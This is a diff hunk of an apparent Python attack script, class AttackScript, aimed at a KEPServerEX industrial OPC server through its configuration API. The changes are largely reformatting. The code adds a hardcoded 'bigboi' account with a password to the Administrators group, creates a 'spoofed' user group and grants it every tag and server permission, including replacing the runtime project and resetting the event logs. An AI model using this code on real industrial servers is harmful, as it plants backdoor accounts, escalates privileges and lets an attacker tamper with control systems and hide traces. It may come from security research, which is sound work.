@@ -1103,69 +1103,74 @@ class AttackScript:
 
     def kep_get_all_users(self):
         server = self.kep_connect()
-        print(json.dumps(admin.users.get_all_users(server),indent=4),file=sys.stdout)
+        print(json.dumps(admin.users.get_all_users(server), indent=4), file=sys.stdout)
 
     def kep_enable_user(self, user):
         server = self.kep_connect()
-        print(admin.users.enable_user(server, user),file=sys.stdout)
+        print(admin.users.enable_user(server, user), file=sys.stdout)
 
     def kep_disable_user(self, user):
         server = self.kep_connect()
-        print(admin.users.disable_user(server, user),file=sys.stdout)
+        print(admin.users.disable_user(server, user), file=sys.stdout)
 
     def kep_get_single_user(self, user):
         server = self.kep_connect()
-        print(json.dumps(admin.users.get_user(server, user),indent=4),file=sys.stdout)
+        print(json.dumps(admin.users.get_user(server, user), indent=4), file=sys.stdout)
 
-    def kep_modify_user(self,user): ## ADDED to modify user requires three input from user - Description and Usergroup name and user to change
+    def kep_modify_user(self,
+                        user):  ## ADDED to modify user requires three input from user - Description and Usergroup name and user to change and password
         server = self.kep_connect()
         print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": "TEST UPDATE",
                                                           "libadminsettings.USERMANAGER_USER_GROUPNAME": "Illuminati",
                                                           "libadminsettings.USERMANAGER_USER_PASSWORD": "icanfreeload69"},
                                                  user="bigboi"), indent=4))
+        print(admin.users.get_user(server, "bigboi"))
 
-    def kep_add_user(self,user): ## GIVE USER NOTE THAT PASSWORD NEEDS TO BE 14 characters or more
+    def kep_add_user(self, user):  ## GIVE USER NOTE THAT PASSWORD NEEDS TO BE 14 characters or more
         server = self.kep_connect()
-        print(admin.users.add_user(server, {"common.ALLTYPES_NAME": "bigboi", "libadminsettings.USERMANAGER_USER_GROUPNAME": "Administrators", "libadminsettings.USERMANAGER_USER_PASSWORD": "SmellyBoiBoiBoi"}))
+        print(admin.users.add_user(server, {"common.ALLTYPES_NAME": "bigboi",
+                                            "libadminsettings.USERMANAGER_USER_GROUPNAME": "Administrators",
+                                            "libadminsettings.USERMANAGER_USER_PASSWORD": "SmellyBoiBoiBoi"}))
 
-    def kep_del_user(self,user): ## ADDED to delete user
+    def kep_del_user(self, user):  ## ADDED to delete user
         server = self.kep_connect()
         print(admin.users.del_user(server, "bigboi"))
 
-    def kep_add_user_group(self, UG): ### ADDED to add spoofed user group
+    def kep_add_user_group(self, UG):  ### ADDED to add spoofed user group
         server = self.kep_connect()
         print(admin.user_groups.add_user_group(server, {"common.ALLTYPES_NAME": "Illuminati"}))
 
-    def kep_delete_user_group(self, UG): ### ADDED to delete user group
+    def kep_delete_user_group(self, UG):  ### ADDED to delete user group
         server = self.kep_connect()
         print(admin.user_groups.del_user_group(server, "Illuminati"))
 
-    def kep_modify_user_group(self, UG): ### ADDED to let user modify user group to superuser
+    def kep_modify_user_group(self, UG):  ### ADDED to let user modify user group to superuser
         server = self.kep_connect()
-        print(admin.user_groups.modify_user_group(server, {"common.ALLTYPES_DESCRIPTION": "VERY SPECIAL GROUP", 
-                                                   "libadminsettings.USERMANAGER_IO_TAG_READ": "Enable", 
-                                                   "libadminsettings.USERMANAGER_GROUP_ENABLED": True,
-                                                   "libadminsettings.USERMANAGER_IO_TAG_READ": True , 
-                                                   "libadminsettings.USERMANAGER_IO_TAG_WRITE": True,
-                                                   "libadminsettings.USERMANAGER_IO_TAG_DYNAMIC_ADDRESSING": True,
-                                                   "libadminsettings.USERMANAGER_SYSTEM_TAG_READ": True,
-                                                   "libadminsettings.USERMANAGER_SYSTEM_TAG_WRITE": True,
-                                                   "libadminsettings.USERMANAGER_INTERNAL_TAG_READ": True,
-                                                   "libadminsettings.USERMANAGER_INTERNAL_TAG_WRITE": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_MANAGE_LICENSES": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_RESET_OPC_DIAGS_LOG": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_RESET_COMM_DIAGS_LOG": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_MODIFY_SERVER_SETTINGS": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_DISCONNECT_CLIENTS": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_RESET_EVENT_LOG": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_OPCUA_DOTNET_CONFIGURATION": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_CONFIG_API_LOG_ACCESS": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_REPLACE_RUNTIME_PROJECT": True,
-                                                   "libadminsettings.USERMANAGER_BROWSE_BROWSENAMESPACE": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_SECURITY": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_ERROR": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_WARNING": True,
-                                                   "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": True}, user_group="Illuminati"))
+        print(admin.user_groups.modify_user_group(server, {"common.ALLTYPES_DESCRIPTION": "VERY SPECIAL GROUP",
+                                                           "libadminsettings.USERMANAGER_IO_TAG_READ": "Enable",
+                                                           "libadminsettings.USERMANAGER_GROUP_ENABLED": True,
+                                                           "libadminsettings.USERMANAGER_IO_TAG_READ": True,
+                                                           "libadminsettings.USERMANAGER_IO_TAG_WRITE": True,
+                                                           "libadminsettings.USERMANAGER_IO_TAG_DYNAMIC_ADDRESSING": True,
+                                                           "libadminsettings.USERMANAGER_SYSTEM_TAG_READ": True,
+                                                           "libadminsettings.USERMANAGER_SYSTEM_TAG_WRITE": True,
+                                                           "libadminsettings.USERMANAGER_INTERNAL_TAG_READ": True,
+                                                           "libadminsettings.USERMANAGER_INTERNAL_TAG_WRITE": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_MANAGE_LICENSES": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_RESET_OPC_DIAGS_LOG": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_RESET_COMM_DIAGS_LOG": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_MODIFY_SERVER_SETTINGS": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_DISCONNECT_CLIENTS": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_RESET_EVENT_LOG": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_OPCUA_DOTNET_CONFIGURATION": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_CONFIG_API_LOG_ACCESS": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_REPLACE_RUNTIME_PROJECT": True,
+                                                           "libadminsettings.USERMANAGER_BROWSE_BROWSENAMESPACE": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_SECURITY": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_ERROR": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_WARNING": True,
+                                                           "libadminsettings.USERMANAGER_SERVER_VIEW_EVENT_LOG_INFO": True},
+                                                  user_group="Illuminati"))
         
     def kep_get_all_user_groups(self): ### ADDED to get all user groups
         server = self.kep_connect()
